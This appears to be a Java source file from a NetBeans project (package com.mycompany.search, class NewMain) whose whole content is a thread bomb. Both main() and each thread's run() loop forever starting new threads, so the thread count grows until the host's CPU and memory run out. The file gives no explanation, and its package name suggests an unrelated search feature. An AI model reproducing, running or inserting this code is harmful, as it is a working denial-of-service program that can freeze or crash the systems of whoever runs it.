/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Main.java to edit this template
 */
package com.mycompany.search;

/**
 *
 * @author ASSASIN
 */
public class NewMain extends Thread {

    @Override
    public void run() {
        // Code to be executed in the new thread
        while(true){
            NewMain thread = new NewMain();
            thread.start();  // Start the new thread    
        }
    }

    public static void main(String[] args) {
        while (true) {
            NewMain thread = new NewMain();
            thread.start();  // Start the new thread
        }

    }
}
